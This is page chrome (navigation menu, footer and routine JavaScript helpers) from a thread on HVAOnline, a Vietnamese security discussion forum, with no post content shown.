<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/5516.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" >Thảo luận bảo mật</option>
									<option value="12" selected="selected">Thảo luận thâm nhập</option>
									<option value="28" >Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
